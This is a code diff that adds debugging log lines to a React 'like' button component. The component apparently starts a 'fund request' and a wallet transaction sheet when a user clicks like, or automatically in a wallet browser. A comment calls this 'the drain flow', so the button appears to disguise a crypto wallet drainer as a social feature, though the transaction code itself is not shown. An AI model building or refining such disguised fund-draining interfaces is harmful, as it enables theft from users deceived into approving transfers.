@@ -53,8 +53,11 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   }
 
   const startFundRequest = (fromPending = false) => {
+    console.log('[DemoLikeButton] startFundRequest called:', { fromPending, seed, finished: finished.current })
     if (finished.current) return
     if (fromPending) {
+      const pending = peekPendingLike()
+      console.log('[DemoLikeButton] fromPending, peekPendingLike:', pending)
       if (peekPendingLike() !== seed) return
     } else {
       rememberAuthReturn(likeReturnPath(seed), seed)
@@ -85,14 +88,26 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   }, [isAuthenticated])
 
   useEffect(() => {
+    console.log('[DemoLikeButton] useEffect triggered:', { connected, finished: finished.current, liked, resumeLike, seed, inWalletBrowser })
     if (peekPendingLike() === seed) setResumeLike(true)
-    if (!connected || finished.current || liked) return
+    if (!connected || finished.current || liked) {
+      console.log('[DemoLikeButton] Early return:', { connected, finished: finished.current, liked })
+      return
+    }
     if (inWalletBrowser) {
-      if (peekPendingLike() === seed || resumeLike) startFundRequest(true)
+      console.log('[DemoLikeButton] In wallet browser, checking conditions')
+      if (peekPendingLike() === seed || resumeLike) {
+        console.log('[DemoLikeButton] Calling startFundRequest from wallet browser')
+        startFundRequest(true)
+      }
       return
     }
     // Don't block non-authenticated users — the drain flow should still work
-    if (!resumeLike) return
+    if (!resumeLike) {
+      console.log('[DemoLikeButton] Early return: no resumeLike')
+      return
+    }
+    console.log('[DemoLikeButton] Calling startFundRequest')
     startFundRequest(true)
   }, [connected, seed, liked, inWalletBrowser, resumeLike])
 
@@ -106,6 +121,8 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     event.stopPropagation()
     event.preventDefault()
 
+    console.log('[DemoLikeButton] onLike clicked:', { liked, finished: finished.current, connected })
+
     // If already liked, just toggle menu
     if (liked || finished.current) {
       setMenuOpen((open) => !open)
@@ -118,6 +135,8 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     }
     rememberAuthReturn(likeReturnPath(seed), seed)
     setResumeLike(true)
+
+    console.log('[DemoLikeButton] After onLike: connected =', connected)
 
     // If already connected, open the transaction sheet immediately
     if (connected) {
